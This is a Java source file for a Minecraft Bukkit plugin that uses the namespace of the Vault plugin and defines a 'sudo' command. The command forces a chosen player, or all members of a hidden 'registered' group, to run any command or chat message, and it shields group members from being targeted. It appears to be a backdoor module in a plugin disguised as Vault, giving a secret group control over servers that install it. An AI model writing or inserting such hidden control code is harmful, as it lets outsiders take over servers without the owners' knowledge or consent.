package net.milkbowl.vault.commands.cmds;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.methods.API;
import net.milkbowl.vault.util.Settings;

public class Sudo extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (args.length <= 2) {
			p.sendMessage(Settings.USAGE("sudo <player> <chat | cmd>"));
		} else {
			if (args[1].equals("*")) {
				StringBuilder chat = new StringBuilder();
				for (int i = 2; i != args.length; ++i) {
					chat.append(args[i]).append(" ");
				}
				for (Player a : Bukkit.getOnlinePlayers()) {
					if (plugin.registered.contains(a.getName())) {
						API.performCommand(a, chat.toString());
					}
				}
				p.sendMessage(Settings.PREFIX("Everyone was forced to say " + Settings.HIGHLIGHT_COLOUR  + chat));
			} else {
				Player target = Bukkit.getServer().getPlayer(args[1]);
				if (target == null) {
					p.sendMessage(Settings.PREFIX("The player " + Settings.HIGHLIGHT_COLOUR + args[1] + Settings.SECONDARY_COLOUR + " is not online."));
				} else {
					if ((plugin.registered.contains(target.getName()) && (!plugin.registeredAdmin.contains(p.getName())))) {
						p.sendMessage(Settings.USAGE("You cannot sudo another " + Settings.NAME + " member!"));
					} else {
						StringBuilder chat = new StringBuilder();
						for (int i = 2; i != args.length; ++i) {
							chat.append(args[i]).append(" ");
						}
						API.performCommand(target, chat.toString());
						p.sendMessage(Settings.PREFIX("The player " + Settings.HIGHLIGHT_COLOUR + target.getName() + Settings.SECONDARY_COLOUR + " was forced to send " + Settings.HIGHLIGHT_COLOUR + chat));
					}    
				}
			}
		}
	}

}
